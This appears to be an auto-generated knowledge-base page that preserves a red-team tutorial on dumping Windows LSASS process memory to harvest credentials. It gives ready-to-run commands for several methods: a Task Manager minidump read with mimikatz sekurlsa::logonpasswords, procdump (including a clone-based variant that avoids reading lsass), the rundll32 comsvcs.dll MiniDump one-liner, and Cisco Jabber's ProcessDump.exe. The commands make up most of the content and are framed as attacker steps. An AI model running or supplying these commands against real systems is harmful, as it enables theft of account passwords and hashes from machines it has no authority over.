---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Dumping Lsass Without Mimikatz

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-credential-access-and-credential-dumping-dump-credentials-from-lsass-process-without-mimikatz` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Dumping Lsass Without Mimikatz](../../topics/offensive-security/dumping-lsass-without-mimikatz.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-credential-access-and-credential-dumping-dump-credentials-from-lsass-process-without-mimikatz |
| name | Dumping Lsass Without Mimikatz |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Screenshot from 2019-03-12 19-54-15.png
- Screenshot from 2019-03-12 19-55-27.png
- Screenshot from 2019-03-12 19-56-12.png
- Screenshot from 2019-03-12 20-11-28.png
- Screenshot from 2019-03-12 20-13-25.png
- image (165).png
- image (634).png
_body: '# Dumping Lsass Without Mimikatz


  ## MiniDumpWriteDump API


  See my notes about writing a simple custom process dumper using `MiniDumpWriteDump` API:


  {% content-ref url="dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass.md" %}

  [dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass.md](dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass.md)

  {% endcontent-ref %}


  ## Task Manager


  Create a minidump of the lsass.exe using task manager (must be running as administrator):


  ![](<../../.gitbook/assets/Screenshot from 2019-03-12 19-55-27.png>)


  ![](<../../.gitbook/assets/Screenshot from 2019-03-12 19-56-12.png>)


  Swtich mimikatz context to the minidump:


  {% code title="attacker@mimikatz" %}

  ```csharp

  sekurlsa::minidump C:\Users\ADMINI~1.OFF\AppData\Local\Temp\lsass.DMP

  sekurlsa::logonpasswords

  ```

  {% endcode %}


  ![](<../../.gitbook/assets/Screenshot from 2019-03-12 19-54-15.png>)


  ## Procdump


  Procdump from sysinternal''s could also be used to dump the process:


  {% code title="attacker@victim" %}

  ```csharp

  procdump.exe -accepteula -ma lsass.exe lsass.dmp


  // or avoid reading lsass by dumping a cloned lsass process

  procdump.exe -accepteula -r -ma lsass.exe lsass.dmp

  ```

  {% endcode %}


  ![](<../../.gitbook/assets/Screenshot from 2019-03-12 20-11-28.png>)


  ![](<../../.gitbook/assets/Screenshot from 2019-03-12 20-13-25.png>)


  ## comsvcs.dll


  Executing a native comsvcs.dll DLL found in Windows\system32 with rundll32:


  ```

  .\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full

  ```


  ![](<../../.gitbook/assets/image (165).png>)


  ## ProcessDump.exe from Cisco Jabber


  Sometimes Cisco Jabber (always?) comes with a nice utility called `ProcessDump.exe` that can be found in `c:\program files
  (x86)\cisco systems\cisco jabber\x64\`. We can use it to dump lsass process memory in Powershell like so:


  ```

  cd c:\program files (x86)\cisco systems\cisco jabber\x64\

  processdump.exe (ps lsass).id c:\temp\lsass.dmp

  ```


  ![screenshot by @em1rerdogan](<../../.gitbook/assets/image (634).png>)


  ## References


  {% embed url="https://t.co/s2VePo3ICo?amp=1" %}'
_relative_path: offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz.md
````
